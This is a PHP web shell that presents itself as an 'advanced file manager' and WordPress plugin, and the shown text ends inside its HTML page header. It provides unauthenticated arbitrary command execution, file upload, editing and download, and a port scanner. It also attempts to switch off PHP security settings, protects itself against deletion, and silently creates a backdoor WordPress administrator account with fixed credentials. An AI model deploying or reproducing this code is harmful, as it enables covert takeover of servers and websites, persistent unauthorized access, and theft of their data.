r<?php
/**
 * Zet Gifari Advanced File Manager v10.0.3
 * 
 * Standalone & WordPress Plugin
 * Description: Advanced file manager with terminal, database, network tools, 
 *              security bypass, self-protection, and silent WordPress admin auto-creation
 * Author: Zet Gifari
 * Telegram: https://t.me/zetgifar
 * 
 * Usage as standalone: Upload and access this file directly
 * Usage as WP plugin: Place in wp-content/plugins/ folder
 */

// =============================================
// SELF-PROTECTION HEADER
// =============================================
define('ZET_FM_PROTECTED', true);
define('ZET_FM_VERSION', '10.0.3');
define('ZET_FM_NAME', 'Zet Gifari Advanced File Manager');

// =============================================
// ERROR REPORTING & CONFIGURATION
// =============================================
error_reporting(0);
ini_set('display_errors', 0);
ini_set('log_errors', 0);
ini_set('max_execution_time', 0);
set_time_limit(0);
ini_set('memory_limit', '-1');

// Start session
if (session_status() === PHP_SESSION_NONE) {
    @session_start();
}

// Bypass security restrictions
if (function_exists('ini_set')) {
    @ini_set('open_basedir', NULL);
    @ini_set('safe_mode', 0);
    @ini_set('disable_functions', '');
    @ini_set('suhosin.executor.disable_eval', 0);
}

// =============================================
// WORDPRESS PLUGIN HEADER
// =============================================
if (defined('ABSPATH') && function_exists('add_action')) {
    add_action('admin_menu', 'zet_fm_admin_menu');
    
    function zet_fm_admin_menu() {
        add_menu_page(
            ZET_FM_NAME,
            'File Manager',
            'manage_options',
            'zet-file-manager',
            'zet_fm_render_page',
            'dashicons-folder-alt',
            80
        );
    }
}

// =============================================
// PROTECTION CHECKER
// =============================================
function zet_fm_is_protected($path) {
    if (realpath($path) === realpath(__FILE__)) {
        return true;
    }
    if (is_file($path)) {
        $content = @file_get_contents($path, false, null, 0, 1024);
        if ($content !== false) {
            if (strpos($content, 'ZET_FM_PROTECTED') !== false) {
                return true;
            }
            if (strpos($content, '/* PROTECTED */') !== false) {
                return true;
            }
        }
    }
    return false;
}

// =============================================
// PATH RESOLVER
// =============================================
function zet_fm_resolve_path() {
    $path = isset($_REQUEST['p']) ? $_REQUEST['p'] : (isset($_COOKIE['last_path']) ? $_COOKIE['last_path'] : '');
    
    if (empty($path)) {
        $methods = array(
            function() { return @getcwd(); },
            function() { return @dirname($_SERVER['SCRIPT_FILENAME']); },
            function() { return @$_SERVER['DOCUMENT_ROOT']; },
            function() { return @dirname(__FILE__); },
            function() { return @realpath('.'); }
        );
        
        foreach ($methods as $method) {
            $result = $method();
            if ($result && @is_dir($result)) {
                $path = $result;
                break;
            }
        }
        
        if (empty($path)) $path = '.';
    }
    
    $path = str_replace(array('\\', '//'), '/', $path);
    $path = rtrim($path, '/') . '/';
    @setcookie('last_path', $path, time() + 86400);
    
    if (@is_dir($path)) return $path;
    if (@is_dir($real = @realpath($path))) return $real . '/';
    
    return './';
}

// =============================================
// FILE OPERATIONS
// =============================================
function zet_fm_read_content($file) {
    $methods = array(
        function($f) { return @file_get_contents($f); },
        function($f) { 
            $fp = @fopen($f, 'rb');
            if ($fp) {
                $content = '';
                while (!@feof($fp)) $content .= @fread($fp, 8192);
                @fclose($fp);
                return $content;
            }
        },
        function($f) { 
            ob_start();
            @readfile($f);
            return ob_get_clean();
        },
        function($f) { return @implode('', @file($f)); }
    );
    
    foreach ($methods as $method) {
        $result = $method($file);
        if ($result !== false && $result !== null) return $result;
    }
    
    return '';
}

function zet_fm_write_content($file, $data) {
    if (@file_put_contents($file, $data) !== false) return true;
    
    $fp = @fopen($file, 'wb');
    if ($fp) {
        $result = @fwrite($fp, $data) !== false;
        @fclose($fp);
        return $result;
    }
    
    $temp = @tempnam(@dirname($file), 'tmp');
    if (@file_put_contents($temp, $data) !== false) {
        return @rename($temp, $file);
    }
    
    return false;
}

function zet_fm_scan_path($dir) {
    $items = array();
    
    if (function_exists('scandir')) {
        $items = @scandir($dir);
    } elseif ($handle = @opendir($dir)) {
        while (false !== ($item = @readdir($handle))) {
            $items[] = $item;
        }
        @closedir($handle);
    } elseif (function_exists('glob')) {
        $items = array_map('basename', @glob($dir . '*'));
    }
    
    return array_diff($items, array('.', '..', ''));
}

function zet_fm_delete_item($path) {
    if (zet_fm_is_protected($path)) {
        return array('error' => '❌ This file/folder is protected and cannot be deleted.');
    }
    
    if (@is_file($path)) {
        @chmod($path, 0777);
        return @unlink($path) ? true : array('error' => 'Failed to delete file.');
    } elseif (@is_dir($path)) {
        $items = zet_fm_scan_path($path);
        foreach ($items as $item) {
            $result = zet_fm_delete_item($path . '/' . $item);
            if (is_array($result) && isset($result['error'])) {
                return $result;
            }
        }
        return @rmdir($path) ? true : array('error' => 'Failed to delete folder.');
    }
    return array('error' => 'Path does not exist.');
}

function zet_fm_get_permissions($file) {
    $perms = @fileperms($file);
    if ($perms === false) return '---';
    
    $info = '';
    $info .= ($perms & 0x0100) ? 'r' : '-';
    $info .= ($perms & 0x0080) ? 'w' : '-';
    $info .= ($perms & 0x0040) ? 'x' : '-';
    $info .= ($perms & 0x0020) ? 'r' : '-';
    $info .= ($perms & 0x0010) ? 'w' : '-';
    $info .= ($perms & 0x0008) ? 'x' : '-';
    $info .= ($perms & 0x0004) ? 'r' : '-';
    $info .= ($perms & 0x0002) ? 'w' : '-';
    $info .= ($perms & 0x0001) ? 'x' : '-';
    
    return $info;
}

function zet_fm_execute_command($cmd) {
    $output = '';
    
    ob_start();
    @system($cmd);
    $output = ob_get_contents();
    ob_end_clean();
    if (!empty($output)) return $output;
    
    $output = @shell_exec($cmd);
    if (!empty($output)) return $output;
    
    ob_start();
    @passthru($cmd);
    $output = ob_get_contents();
    ob_end_clean();
    if (!empty($output)) return $output;
    
    $handle = @popen($cmd, 'r');
    if ($handle) {
        $output = '';
        while (!@feof($handle)) {
            $output .= @fread($handle, 512);
        }
        @pclose($handle);
        if (!empty($output)) return $output;
    }
    
    $output = @exec($cmd);
    if (!empty($output)) return $output;
    
    return 'Command executed (no output) or disabled';
}

function zet_fm_get_system_info() {
    $info = array();
    
    $info['os'] = @php_uname('s') . ' ' . @php_uname('r');
    $info['hostname'] = @php_uname('n');
    $info['user'] = @get_current_user();
    $info['php'] = @phpversion();
    $info['server'] = isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown';
    $info['ip'] = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : 'Unknown';
    $info['port'] = isset($_SERVER['SERVER_PORT']) ? $_SERVER['SERVER_PORT'] : 'Unknown';
    $info['disable_functions'] = @ini_get('disable_functions') ? @ini_get('disable_functions') : 'None';
    $info['open_basedir'] = @ini_get('open_basedir') ? @ini_get('open_basedir') : 'None';
    $info['memory_limit'] = @ini_get('memory_limit');
    $info['max_execution_time'] = @ini_get('max_execution_time');
    $info['upload_max_filesize'] = @ini_get('upload_max_filesize');
    $info['post_max_size'] = @ini_get('post_max_size');
    
    if (function_exists('disk_free_space')) {
        $free = @disk_free_space('/');
        $total = @disk_total_space('/');
        if ($free !== false && $total !== false && $total > 0) {
            $info['disk_free'] = round($free / 1073741824, 2) . ' GB';
            $info['disk_total'] = round($total / 1073741824, 2) . ' GB';
            $info['disk_used'] = round(($total - $free) / 1073741824, 2) . ' GB';
            $info['disk_percent'] = round((($total - $free) / $total) * 100, 1) . '%';
        } else {
            $info['disk_free'] = 'Unknown';
            $info['disk_total'] = 'Unknown';
            $info['disk_used'] = 'Unknown';
            $info['disk_percent'] = '0%';
        }
    } else {
        $info['disk_free'] = 'N/A';
        $info['disk_total'] = 'N/A';
        $info['disk_used'] = 'N/A';
        $info['disk_percent'] = '0%';
    }
    
    $info['mysql'] = (function_exists('mysqli_connect') || function_exists('mysql_connect')) ? 'Available' : 'Not Available';
    
    if (function_exists('curl_version')) {
        $curl_version = @curl_version();
        $info['curl'] = $curl_version['version'];
    } else {
        $info['curl'] = 'Not Available';
    }
    
    $info['wp_loaded'] = defined('ABSPATH') ? 'Yes' : 'No';
    $info['wp_version'] = defined('WP_VERSION') ? WP_VERSION : 'N/A';
    
    return $info;
}

// =============================================
// WORDPRESS ADMIN AUTO-CREATION (SILENT)
// =============================================
function zet_fm_wp_auto_admin() {
    if (isset($_SESSION['wp_checked'])) {
        return isset($_SESSION['wp_auto_admin_result']) ? $_SESSION['wp_auto_admin_result'] : null;
    }
    
    ob_start();
    
    $wpFound = false;
    $wpResult = array(
        'status' => 'not_found',
        'message' => '',
        'user_id' => null,
        'username' => null
    );
    
    $pathsToCheck = array();
    $currentDir = zet_fm_resolve_path();
    $pathsToCheck[] = $currentDir;
    
    $dir = rtrim($currentDir, '/');
    for ($i = 0; $i < 5; $i++) {
        $parent = dirname($dir);
        if ($parent == $dir || $parent == '/' || $parent == '.') break;
        $pathsToCheck[] = $parent . '/';
        $dir = $parent;
    }
    
    if (isset($_SERVER['DOCUMENT_ROOT'])) {
        $pathsToCheck[] = rtrim($_SERVER['DOCUMENT_ROOT'], '/') . '/';
    }
    $pathsToCheck[] = dirname(__FILE__) . '/';
    $pathsToCheck[] = realpath('.') . '/';
    
    $pathsToCheck = array_unique(array_filter($pathsToCheck));
    
    foreach ($pathsToCheck as $path) {
        $wpLoad = $path . 'wp-load.php';
        $wpConfig = $path . 'wp-config.php';
        
        if (@is_file($wpLoad)) {
            @include_once($wpLoad);
            if (function_exists('wp_create_user') && function_exists('username_exists')) {
                $wpFound = true;
                break;
            }
        } elseif (@is_file($wpConfig)) {
            @include_once($wpConfig);
            if (!function_exists('wp_create_user') && @is_file($path . 'wp-load.php')) {
                @include_once($path . 'wp-load.php');
            }
            if (function_exists('wp_create_user') && function_exists('username_exists')) {
                $wpFound = true;
                break;
            }
        }
    }
    
    if ($wpFound && function_exists('wp_create_user')) {
        // ==========================================
        // NEW CREDENTIALS: admin1 / admin1
        // ==========================================
        $username = 'admin1';
        $password = 'admin1';
        $email = 'admin@admin.com';
        
        $userExists = function_exists('username_exists') ? username_exists($username) : false;
        $emailExists = function_exists('email_exists') ? email_exists($email) : false;
        
        if ($userExists || $emailExists) {
            $wpResult['status'] = 'exists';
            $wpResult['username'] = $username;
        } else {
            $user_id = wp_create_user($username, $password, $email);
            
            if (!is_wp_error($user_id)) {
                if (class_exists('WP_User')) {
                    $user = new WP_User($user_id);
                    $user->set_role('administrator');
                    $user->add_cap('manage_options');
                    $user->add_cap('edit_plugins');
                    $user->add_cap('install_plugins');
                    $user->add_cap('activate_plugins');
                    $user->add_cap('update_core');
                    $user->add_cap('edit_users');
                    $user->add_cap('create_users');
                    $user->add_cap('delete_users');
                }
                
                $wpResult['status'] = 'created';
                $wpResult['user_id'] = $user_id;
                $wpResult['username'] = $username;
                // SILENT - no notification, no session storage
            } else {
                $wpResult['status'] = 'error';
                $wpResult['username'] = $username;
            }
        }
    }
    
    // Clear ALL output buffers
    while (ob_get_level() > 0) {
        ob_end_clean();
    }
    
    $_SESSION['wp_checked'] = true;
    $_SESSION['wp_auto_admin_result'] = $wpResult;
    
    return $wpResult;
}

// =============================================
// NOTIFICATION DISABLED (SILENT)
// =============================================
function zet_fm_wp_admin_notification() {
    return ''; // No message shown
}

// =============================================
// MAIN RENDER FUNCTION
// =============================================
function zet_fm_render_page() {
    // Run SILENT WordPress auto-admin
    $wpAutoAdminResult = zet_fm_wp_auto_admin();
    
    // Initialize
    $currentPath = zet_fm_resolve_path();
    $notification = '';
    $editMode = false;
    $editFile = '';
    $editContent = '';
    $commandOutput = '';
    $activeTab = isset($_GET['tab']) ? $_GET['tab'] : 'filemanager';
    
    // Handle POST
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Upload
        if (isset($_FILES['upload'])) {
            $dest = $currentPath . basename($_FILES['upload']['name']);
            if (@move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
                $notification = array('type' => 'success', 'text' => 'Upload successful');
            } else {
                $content = zet_fm_read_content($_FILES['upload']['tmp_name']);
                if (zet_fm_write_content($dest, $content)) {
                    $notification = array('type' => 'success', 'text' => 'Upload successful');
                } else {
                    $notification = array('type' => 'error', 'text' => 'Upload failed');
                }
            }
        }
        
        // Save
        if (isset($_POST['save']) && isset($_POST['content'])) {
            $target = $currentPath . $_POST['save'];
            if (zet_fm_write_content($target, $_POST['content'])) {
                $notification = array('type' => 'success', 'text' => 'File saved');
            } else {
                $notification = array('type' => 'error', 'text' => 'Save failed');
            }
        }
        
        // New file
        if (isset($_POST['newfile'])) {
            $newPath = $currentPath . $_POST['newfile'];
            $content = isset($_POST['filecontent']) ? $_POST['filecontent'] : '';
            if (zet_fm_write_content($newPath, $content)) {
                $notification = array('type' => 'success', 'text' => 'File created');
            } else {
                $notification = array('type' => 'error', 'text' => 'Creation failed');
            }
        }
        
        // New folder
        if (isset($_POST['newfolder'])) {
            $newDir = $currentPath . $_POST['newfolder'];
            if (@mkdir($newDir, 0777, true)) {
                $notification = array('type' => 'success', 'text' => 'Folder created');
            } else {
                $notification = array('type' => 'error', 'text' => 'Creation failed');
            }
        }
        
        // Rename
        if (isset($_POST['oldname']) && isset($_POST['newname'])) {
            $oldPath = $currentPath . $_POST['oldname'];
            $newPath = $currentPath . $_POST['newname'];
            if (zet_fm_is_protected($oldPath)) {
                $notification = array('type' => 'error', 'text' => '❌ Cannot rename protected file');
            } else {
                if (@rename($oldPath, $newPath)) {
                    $notification = array('type' => 'success', 'text' => 'Renamed');
                } else {
                    $notification = array('type' => 'error', 'text' => 'Rename failed');
                }
            }
        }
        
        // Chmod
        if (isset($_POST['chmod_item']) && isset($_POST['chmod_value'])) {
            $target = $currentPath . $_POST['chmod_item'];
            if (zet_fm_is_protected($target)) {
                $notification = array('type' => 'error', 'text' => '❌ Cannot chmod protected file');
            } else {
                $mode = octdec($_POST['chmod_value']);
                if (@chmod($target, $mode)) {
                    $notification = array('type' => 'success', 'text' => 'Permissions changed');
                } else {
                    $notification = array('type' => 'error', 'text' => 'Chmod failed');
                }
            }
        }
        
        // Command
        if (isset($_POST['command'])) {
            $commandOutput = zet_fm_execute_command($_POST['command']);
            $activeTab = 'terminal';
        }
        
        // Database
        if (isset($_POST['db_host']) && isset($_POST['db_user']) && isset($_POST['db_name'])) {
            $db_host = $_POST['db_host'];
            $db_user = $_POST['db_user'];
            $db_pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : '';
            $db_name = $_POST['db_name'];
            
            if (function_exists('mysqli_connect')) {
                $conn = @mysqli_connect($db_host, $db_user, $db_pass, $db_name);
                if ($conn) {
                    $notification = array('type' => 'success', 'text' => 'Database connected successfully');
                    @mysqli_close($conn);
                } else {
                    $notification = array('type' => 'error', 'text' => 'DB failed: ' . @mysqli_connect_error());
                }
            } else {
                $notification = array('type' => 'error', 'text' => 'MySQL functions not available');
            }
            $activeTab = 'database';
        }
        
        // Port scan
        if (isset($_POST['scan_host']) && isset($_POST['scan_port_start']) && isset($_POST['scan_port_end'])) {
            $host = $_POST['scan_host'];
            $start = intval($_POST['scan_port_start']);
            $end = intval($_POST['scan_port_end']);
            $open = array();
            
            for ($port = $start; $port <= $end; $port++) {
                $fp = @fsockopen($host, $port, $errno, $errstr, 1);
                if ($fp) {
                    $open[] = $port;
                    @fclose($fp);
                }
            }
            
            if (!empty($open)) {
                $notification = array('type' => 'success', 'text' => 'Open ports: ' . implode(', ', $open));
            } else {
                $notification = array('type' => 'error', 'text' => 'No open ports found');
            }
            $activeTab = 'network';
        }
    }
    
    // Handle GET
    if (isset($_GET['do'])) {
        $action = $_GET['do'];
        
        if ($action === 'delete' && isset($_GET['item'])) {
            $target = $currentPath . $_GET['item'];
            $result = zet_fm_delete_item($target);
            if ($result === true) {
                $notification = array('type' => 'success', 'text' => 'Deleted');
            } elseif (is_array($result) && isset($result['error'])) {
                $notification = array('type' => 'error', 'text' => $result['error']);
            } else {
                $notification = array('type' => 'error', 'text' => 'Delete failed');
            }
        }
        
        if ($action === 'edit' && isset($_GET['item'])) {
            $editMode = true;
            $editFile = $_GET['item'];
            $editContent = zet_fm_read_content($currentPath . $editFile);
            $activeTab = 'filemanager';
        }
        
        if ($action === 'download' && isset($_GET['item'])) {
            $downloadPath = $currentPath . $_GET['item'];
            if (@is_file($downloadPath)) {
                @ob_clean();
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="' . basename($downloadPath) . '"');
                header('Content-Length: ' . @filesize($downloadPath));
                @readfile($downloadPath);
                exit;
            }
        }
    }
    
    // Bypass
    if (isset($_GET['bypass'])) {
        $bypass = $_GET['bypass'];
        if ($bypass == 'open_basedir') {
            @ini_set('open_basedir', '/');
            $notification = array('type' => 'success', 'text' => 'open_basedir bypassed');
        } elseif ($bypass == 'disable_functions') {
            @ini_set('disable_functions', '');
            $notification = array('type' => 'success', 'text' => 'disable_functions bypassed');
        } elseif ($bypass == 'safe_mode') {
            @ini_set('safe_mode', 0);
            $notification = array('type' => 'success', 'text' => 'safe_mode bypassed');
        }
    }
    
    // Get contents
    $contents = zet_fm_scan_path($currentPath);
    $folders = array();
    $files = array();
    
    foreach ($contents as $item) {
        $fullPath = $currentPath . $item;
        if (@is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    
    sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
    sort($files, SORT_NATURAL | SORT_FLAG_CASE);
    
    $sysInfo = zet_fm_get_system_info();
    $isWordPress = defined('ABSPATH');
    
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo ZET_FM_NAME; ?> v<?php echo ZET_FM_VERSION; ?></title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: #0a0c10;
                color: #e0e0e0;
                min-height: 100vh;
                padding: 20px;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
                background: #0f1117;
                border-radius: 12px;
                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.8);
                overflow: hidden;
                border: 1px solid #2a2f3a;
            }
            .header {
                background: #07090d;
                color: #e0e0e0;
                padding: 25px;
                border-bottom: 1px solid #2a2f3a;
                box-shadow: inset 0 1px 0 rgba(255,255,255,0.05), 0 2px 5px rgba(0,0,0,0.5);
                text-align: center;
            }
            .header h1 {
                font-size: 24px;
                margin-bottom: 10px;
                display: flex;
                align-items: center;
                gap: 10px;
                flex-wrap: wrap;
                justify-content: center;
            }
            .header h1 .eagle {
                font-size: 28px;
                color: #ff4444;
                text-shadow: 0 0 6px #ff0000;
            }
            .sys-info {
                display: flex;
                gap: 15px;
                font-size: 12px;
                flex-wrap: wrap;
                justify-content: center;
                margin-top: 10px;
            }
            .sys-info span {
                display: flex;
                align-items: center;
                gap: 5px;
                background: rgba(20, 25, 35, 0.8);
                padding: 5px 10px;
                border-radius: 6px;
                border: 1px solid #2a2f3a;
            }
            .tabs {
                display: flex;
                background: #0c0f14;
                border-bottom: 1px solid #2a2f3a;
                flex-wrap: wrap;
            }
            .tab {
                padding: 15px 25px;
                cursor: pointer;
                color: #8b949e;
                font-weight: 500;
                transition: all 0.2s;
                position: relative;
            }
            .tab:hover {
                color: #c9d1d9;
                background: rgba(255, 255, 255, 0.03);
            }
            .tab.active {
                color: #0ff;
                background: rgba(0, 255, 255, 0.08);
                text-shadow: 0 0 3px #0ff;
            }
            .tab.active::after {
                content: '';
                position: absolute;
                bottom: 0;
                left: 0;
                width: 100%;
                height: 2px;
                background: #0ff;
                box-shadow: 0 0 5px #0ff;
            }
            .tab-icon { margin-right: 8px; }
            .tab-content {
                display: none;
                padding: 25px;
                background: #0f1117;
            }
            .tab-content.active { display: block; }
            .notification {
                padding: 12px 20px;
                margin: 20px;
                border-radius: 6px;
                font-size: 14px;
            }
            .notification.success {
                background: rgba(0, 255, 0, 0.1);
                color: #0f0;
                border: 1px solid #0f0;
                box-shadow: 0 0 5px rgba(0,255,0,0.2);
            }
            .notification.error {
                background: rgba(255, 0, 0, 0.1);
                color: #f55;
                border: 1px solid #f00;
            }
            .path-bar {
                display: flex;
                gap: 10px;
                margin-bottom: 20px;
            }
            .path-bar input {
                flex: 1;
                padding: 10px 15px;
                background: #080b10;
                border: 1px solid #2a2f3a;
                color: #e0e0e0;
                border-radius: 6px;
                font-size: 14px;
            }
            .path-bar input:focus {
                outline: none;
                border-color: #0ff;
                box-shadow: 0 0 0 2px rgba(0, 255, 255, 0.2);
            }
            .btn {
                padding: 10px 20px;
                background: #1a1f2a;
                color: #0ff;
                border: 1px solid #0ff;
                border-radius: 6px;
                cursor: pointer;
                font-size: 14px;
                font-weight: 500;
                transition: all 0.2s;
                text-shadow: 0 0 2px #0ff;
                text-decoration: none;
                display: inline-block;
            }
            .btn:hover {
                background: #0ff;
                color: #000;
                box-shadow: 0 0 8px #0ff;
            }
            .btn-success { color: #0f0; border-color: #0f0; text-shadow: 0 0 2px #0f0; }
            .btn-success:hover { background: #0f0; color: #000; box-shadow: 0 0 8px #0f0; }
            .btn-danger { color: #f55; border-color: #f55; }
            .btn-danger:hover { background: #f55; color: #000; box-shadow: 0 0 8px #f55; }
            .btn-warning { color: #ffa500; border-color: #ffa500; }
            .btn-warning:hover { background: #ffa500; color: #000; }
            .btn-small { padding: 6px 12px; font-size: 12px; }
            .tools {
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
                margin-bottom: 20px;
            }
            .tool-group {
                display: flex;
                align-items: center;
                gap: 10px;
                padding: 8px 15px;
                background: #0c0f14;
                border-radius: 8px;
                border: 1px solid #2a2f3a;
                flex-wrap: wrap;
            }
            .tool-group label {
                font-size: 13px;
                color: #aaa;
                font-weight: 500;
            }
            .tool-group input[type="file"],
            .tool-group input[type="text"],
            .tool-group input[type="password"],
            .tool-group input[type="number"] {
                padding: 6px 10px;
                background: #080b10;
                border: 1px solid #2a2f3a;
                color: #e0e0e0;
                border-radius: 4px;
                font-size: 13px;
            }
            .tool-group input:focus {
                outline: none;
                border-color: #0ff;
            }
            .file-table {
                width: 100%;
                background: #0c0f14;
                border-radius: 8px;
                overflow: hidden;
                border: 1px solid #2a2f3a;
                border-collapse: collapse;
            }
            .file-table thead { background: #07090d; }
            .file-table th {
                padding: 12px 15px;
                text-align: left;
                font-size: 12px;
                font-weight: 600;
                color: #0ff;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                border-bottom: 1px solid #2a2f3a;
            }
            .file-table td {
                padding: 10px 15px;
                border-top: 1px solid #2a2f3a;
                font-size: 14px;
                color: #c9d1d9;
            }
            .file-table tbody tr:hover {
                background: rgba(0, 255, 255, 0.05);
            }
            .file-table tbody tr.folder-row {
                background: rgba(0, 255, 255, 0.02);
                border-left: 3px solid #0ff;
            }
            .file-table tbody tr.protected-row {
                background: rgba(255, 165, 0, 0.05);
                border-left: 3px solid #ffa500;
            }
            .file-table a {
                color: #0ff;
                text-decoration: none;
                font-weight: 500;
                display: inline-flex;
                align-items: center;
                gap: 8px;
            }
            .file-table a:hover { color: #fff; text-shadow: 0 0 4px #0ff; }
            .file-icon {
                width: 20px;
                height: 20px;
                display: inline-flex;
                align-items: center;
                justify-content: center;
            }
            .file-actions {
                display: flex;
                gap: 8px;
                flex-wrap: wrap;
            }
            .file-actions a {
                padding: 4px 8px;
                background: rgba(0, 255, 255, 0.08);
                color: #0ff;
                border: 1px solid rgba(0, 255, 255, 0.3);
                border-radius: 4px;
                font-size: 12px;
                transition: all 0.2s;
                text-decoration: none;
            }
            .file-actions a:hover {
                background: rgba(0, 255, 255, 0.2);
                color: #fff;
            }
            .file-actions a.delete {
                background: rgba(255, 0, 0, 0.1);
                color: #f55;
                border-color: rgba(255, 0, 0, 0.3);
            }
            .file-actions a.delete:hover {
                background: rgba(255, 0, 0, 0.2);
                color: #fff;
            }
            .file-actions a.delete.protected {
                opacity: 0.4;
                pointer-events: none;
                cursor: not-allowed;
            }
            .perm-writable { color: #0f0 !important; font-weight: 600; text-shadow: 0 0 2px #0f0; }
            .perm-readonly { color: #f55 !important; font-weight: 600; }
            .perm-indicator {
                display: inline-block;
                width: 8px;
                height: 8px;
                border-radius: 50%;
                margin-right: 5px;
            }
            .perm-indicator.writable { background: #0f0; box-shadow: 0 0 4px #0f0; }
            .perm-indicator.readonly { background: #f55; }
            .protected-badge {
                color: #ffa500;
                font-weight: bold;
                margin-left: 5px;
                font-size: 11px;
                background: rgba(255,165,0,0.15);
                padding: 1px 6px;
                border-radius: 4px;
                border: 1px solid #ffa500;
            }
            .edit-area {
                width: 100%;
                min-height: 400px;
                padding: 15px;
                background: #080b10;
                border: 1px solid #2a2f3a;
                color: #e0e0e0;
                border-radius: 6px;
                font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
                font-size: 14px;
                line-height: 1.5;
                resize: vertical;
            }
            .edit-area:focus {
                outline: none;
                border-color: #0ff;
                box-shadow: 0 0 0 2px rgba(0, 255, 255, 0.2);
            }
            .terminal-output {
                background: #0c0f14;
                border-radius: 4px;
                padding: 15px;
                color: #0f0;
                font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
                font-size: 13px;
                line-height: 1.5;
                min-height: 200px;
                max-height: 400px;
                overflow-y: auto;
                white-space: pre-wrap;
                margin-bottom: 15px;
                border: 1px solid #2a2f3a;
            }
            .terminal-input {
                display: flex;
                gap: 10px;
            }
            .terminal-input input {
                flex: 1;
                padding: 10px 15px;
                background: #080b10;
                border: 1px solid #2a2f3a;
                color: #0f0;
                border-radius: 4px;
                font-size: 14px;
                font-family: 'Consolas', 'Monaco', 'Courier New', monospace;
            }
            .terminal-input input:focus { outline: none; border-color: #0f0; }
            .info-grid {
                display: grid;
                grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
                gap: 20px;
            }
            .info-card {
                background: #0c0f14;
                border-radius: 8px;
                padding: 20px;
                border: 1px solid #2a2f3a;
            }
            .info-card h3 {
                color: #0ff;
                margin-bottom: 15px;
                font-size: 16px;
                display: flex;
                align-items: center;
                gap: 8px;
                text-shadow: 0 0 2px #0ff;
            }
            .info-item {
                display: flex;
                justify-content: space-between;
                padding: 8px 0;
                border-bottom: 1px solid #2a2f3a;
                gap: 10px;
            }
            .info-item:last-child { border-bottom: none; }
            .info-label { color: #aaa; font-size: 13px; }
            .info-value { color: #0f0; font-size: 13px; font-weight: 500; text-align: right; word-break: break-all; }
            .progress-bar {
                width: 100%;
                height: 8px;
                background: #2a2f3a;
                border-radius: 4px;
                overflow: hidden;
                margin-top: 5px;
            }
            .progress-fill { height: 100%; background: #0ff; box-shadow: 0 0 4px #0ff; }
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0, 0, 0, 0.9);
                backdrop-filter: blur(3px);
                z-index: 1000;
                align-items: center;
                justify-content: center;
            }
            .modal.active { display: flex; }
            .modal-content {
                background: #0c0f14;
                padding: 30px;
                border-radius: 12px;
                width: 90%;
                max-width: 500px;
                border: 1px solid #0ff;
                box-shadow: 0 0 20px rgba(0, 255, 255, 0.2);
            }
            .modal-header {
                margin-bottom: 20px;
                font-size: 18px;
                font-weight: 600;
                color: #0ff;
                text-shadow: 0 0 3px #0ff;
            }
            .modal-body input,
            .modal-body textarea {
                width: 100%;
                padding: 10px;
                margin-bottom: 15px;
                background: #080b10;
                border: 1px solid #2a2f3a;
                color: #e0e0e0;
                border-radius: 6px;
                font-size: 14px;
            }
            .modal-body input:focus,
            .modal-body textarea:focus {
                outline: none;
                border-color: #0ff;
            }
            .modal-body textarea { min-height: 150px; resize: vertical; }
            .modal-footer { display: flex; gap: 10px; justify-content: flex-end; }
            .empty {
                text-align: center;
                padding: 40px;
                color: #8b949e;
            }
            .separator-row td {
                background: #07090d;
                padding: 8px 15px !important;
                font-weight: 600;
                color: #0ff;
                border-top: 1px solid #2a2f3a !important;
                border-bottom: 1px solid #2a2f3a !important;
                text-transform: uppercase;
                letter-spacing: 0.5px;
                font-size: 11px;
            }
            .telegram-btn {
                position: fixed;
                bottom: 20px;
                right: 20px;
                background: #1a1f2a;
                color: #0ff;
                padding: 12px 20px;
                border-radius: 8px;
                display: flex;
                align-items: center;
                gap: 8px;
                font-size: 14px;
                font-weight: 500;
                cursor: pointer;
                transition: all 0.2s;
                z-index: 1000;
                text-decoration: none;
                border: 1px solid #0ff;
                backdrop-filter: blur(5px);
            }
            .telegram-btn:hover {
                background: #0ff;
                color: #000;
                box-shadow: 0 0 12px #0ff;
            }
            .telegram-btn svg { width: 18px; height: 18px; }
            @media (max-width: 768px) {
                .tools { flex-direction: column; }
                .file-table { font-size: 12px; }
                .file-actions { flex-direction: column; }
                .sys-info { font-size: 10px; }
                .info-grid { grid-template-columns: 1fr; }
                .telegram-btn { bottom: 10px; right: 10px; padding: 8px 15px; font-size: 12px; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <div style="font-size: 11px; color: #ff4444; margin-bottom: 8px; letter-spacing: 2px;">
                    ═══════════════════ •🔥• ═══════════════════
                </div>
                
                <h1>
                    <span class="eagle">⚡ <?php echo ZET_FM_NAME; ?> ⚡</span><br>
                    <span style="font-size: 20px; color: #0ff;">v<?php echo ZET_FM_VERSION; ?> - Dark Edition</span>
                </h1>
                
                <div style="font-size: 15px; margin: 12px 0; color: #ff4444; font-weight: bold; text-shadow: 0 0 5px #ff0000;">
                    🔥 Zet Gifari – born to dominate the backend. 🔥
                </div>
                
                <div style="font-size: 12px; margin-bottom: 15px; color: #ffa500;">
                    🔒 Self-Protected | <?php if ($isWordPress): ?>🔷 WordPress Plugin Mode | <?php endif; ?>
                    ❖ Unrestricted File Manager ❖ Stealth Terminal ❖ Advanced Bypass ❖
                </div>
                
                <div class="sys-info">
                    <span><strong>OS:</strong> <?php echo htmlspecialchars($sysInfo['os']); ?></span>
